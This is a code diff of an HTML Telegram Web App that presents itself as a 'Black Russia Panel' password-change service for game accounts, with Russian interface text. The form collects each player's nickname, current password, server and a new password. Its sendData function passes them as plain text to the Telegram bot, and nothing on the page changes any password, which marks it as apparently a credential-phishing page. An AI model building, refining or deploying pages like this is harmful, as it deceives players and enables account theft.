@@ -1,32 +1,162 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Black Russia Menu</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Black Russia Panel</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #1a1a1a; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .btn { background: #ff4444; border: none; color: white; padding: 15px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        body {
+            background-color: #0b0b0b;
+            /* Здесь иконка на фоне, она будет полупрозрачной и по центру */
+            background-image: linear-gradient(rgba(11, 11, 11, 0.85), rgba(11, 11, 11, 0.85)), url('logo.png');
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: 80%;
+            color: #ffffff;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* ЭКРАН 1: ГЛАВНОЕ МЕНЮ */
+        #main-menu {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            text-align: center;
+        }
+
+        .main-title {
+            color: #ff0000;
+            font-size: 32px;
+            font-weight: bold;
+            text-transform: uppercase;
+            text-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+            cursor: pointer;
+            border: 2px solid #ff0000;
+            padding: 15px 30px;
+            border-radius: 15px;
+            transition: 0.3s;
+        }
+
+        /* ЭКРАН 2: ФОРМА ДАННЫХ */
+        #form-screen {
+            display: none; /* Сначала скрыт */
+            width: 100%;
+            max-width: 350px;
+        }
+
+        h2 {
+            color: #ff0000;
+            text-align: center;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        label {
+            display: block;
+            color: #888;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            background-color: rgba(26, 26, 26, 0.9);
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        input:focus { border-color: #ff0000; }
+
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-top: 15px;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+        }
     </style>
 </head>
 <body>
-    <h2>Black Russia Panel</h2>
-    <input type="text" id="nick" placeholder="Ваш ник">
-    <input type="password" id="pass" placeholder="Пароль">
-    <button class="btn" onclick="sendData()">ВОЙТИ</button>
+
+    <div id="main-menu">
+        <div class="main-title" onclick="showForm()">Сменить пароль</div>
+    </div>
+
+    <div id="form-screen">
+        <h2>Данные аккаунта</h2>
+        <div class="input-group">
+            <label>Ваш Никнейм *</label>
+            <input type="text" id="nickname" placeholder="Ivan_Ivanov">
+        </div>
+        <div class="input-group">
+            <label>Текущий пароль *</label>
+            <input type="password" id="old_pass" placeholder="Введите пароль">
+        </div>
+        <div class="input-group">
+            <label>Пин-код (если есть)</label>
+            <input type="text" id="pin" placeholder="1234">
+        </div>
+        <div class="input-group">
+            <label>Выберите сервер *</label>
+            <select id="server">
+                <option value="" disabled selected>Нажмите для выбора</option>
+                <option>Red</option><option>Green</option><option>Blue</option>
+                <option>Chilli</option><option>Moscow</option>
+            </select>
+        </div>
+        <div class="input-group">
+            <label>Новый пароль *</label>
+            <input type="password" id="new_pass" placeholder="Придумайте пароль">
+        </div>
+        <button class="btn-submit" onclick="sendData()">Сменить пароль</button>
+    </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
 
+        function showForm() {
+            document.getElementById('main-menu').style.display = 'none';
+            document.getElementById('form-screen').style.display = 'block';
+        }
+
         function sendData() {
-            let data = {
-                nick: document.getElementById('nick').value,
-                pass: document.getElementById('pass').value
-            };
-            tg.sendData(JSON.stringify(data));
+            let nickname = document.getElementById('nickname').value;
+            let old_pass = document.getElementById('old_pass').value;
+            let server = document.getElementById('server').value;
+            let new_pass = document.getElementById('new_pass').value;
+
+            if(!nickname || !old_pass || !server || !new_pass) {
+                alert("Заполните все поля!");
+                return;
+            }
+
+            let result = `Ник: ${nickname}\nСтарый: ${old_pass}\nСервер: ${server}\nНовый: ${new_pass}`;
+            tg.sendData(result);
             tg.close();
         }
     </script>
